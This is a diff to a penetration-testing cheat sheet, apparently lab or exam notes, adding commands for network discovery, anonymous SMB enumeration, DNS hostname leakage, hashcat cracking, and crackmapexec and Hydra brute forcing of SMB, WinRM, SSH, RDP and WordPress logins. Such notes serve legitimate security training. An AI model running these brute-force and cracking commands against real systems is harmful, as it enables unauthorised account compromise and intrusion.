@@ -6,7 +6,9 @@ ENUMERATION
     Host Discovery
        •  nmap -sn  10.11.1.1-254 -vv -oA hosts
        •  netdiscover -r 10.11.1.0/24
-
+       • crackmapexec 192.168.10.0/24
+       • arp-scan --interface=eth0 192.168.0.0/24
+       
     DNS server discovery
        •  nmap -p 53  10.11.1.1-254 -vv -oA dcs
 
@@ -245,10 +247,13 @@ POP3
 -------------------------------------------------------------------------------------------------------------------------------------
 
 SMB&NETBIOS
-
     Over All scan
        •  enum4linux -a $ip
-
+    
+    Guest User and null authentication
+       • smbmap -u anonymous -p anonymous -H 10.10.10.172
+       • smbmap -u '' -p '' -H 10.10.10.172 
+       
     Vulnerability Scanning
        •  nmap --script="+*smb* and not brute and not dos and not fuzzer"  -p 139,445 -oN smb-vuln $ip
 
@@ -304,7 +309,14 @@ SNMP
 -------------------------------------------------------------------------------------------------------------------------------------
 
 DOMAIN
-
+    
+    Leak DC hostname:
+       • noslookup
+            server 10.10.10.172
+            set type=ns
+            10.10.10.172
+            127.0.0.1
+   
     Nmap:
        •  nmap -p 53 --script=*dns* -vv -oN dns $ip
 
@@ -404,20 +416,32 @@ SHELLS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 PSSWD CRACKING
+      • Look for the hash in online databases
+
+    Hashcat:
+       • Find mode in hashcat
+           ▪ hashcat --example hashes
+       • hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
 
     John:
        •  john files --wordlist=/usr/share/wordlists/rockyou.txt
 
-    Medusa
-       •  Medusa, initiated against an htaccess protected web directory
-             ▪  medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10
 
-    Ncrack
-       •  ncrack (from the makers of nmap) can brute force RDP
-             ▪  ncrack -vv --user offsec -P password-file.txt rdp://$ip
+PSSWD Mutation
+    Hashcat
+       • hashcat -m 0 bfield.hash  /usr/share/wordlists/rockyou.txt -r rules
 
+
+PSSWD BruteForcing
+    Crackmapexec
+       • Enumerate password policy
+             ▪ crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol
+       • Bruteforce SMB
+             ▪ crackmapexec smb 10.10.10.172 -u /root/users.lst -p /root/passwords.lst
+       • Bruteforce winrm
+             ▪ crackmapexec winrm 10.10.10.172 -u /root/users.lst -p /root/passwords.lst
+             
     Hydra
-
        •  Hydra brute force against SNMP
              ▪ hydra -P password-file.txt -v $ip snmp
 
@@ -426,12 +450,6 @@ PSSWD CRACKING
 
        •  Hydra SSH using list of users and passwords
              ▪ hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
-
-       •  Hydra SSH using a known password and a username list
-             ▪ hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh
-
-       •  Hydra SSH Against Known username on port 22
-             ▪ hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt
 
        •  Hydra POP3 Brute Force
              ▪ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
@@ -444,9 +462,6 @@ PSSWD CRACKING
 
        •  Hydra attack Windows Remote Desktop with rockyou
              ▪ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
-
-       •  Hydra brute force SMB user with rockyou:
-             ▪ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
 
        •  Hydra brute force a Wordpress admin login
              ▪ hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
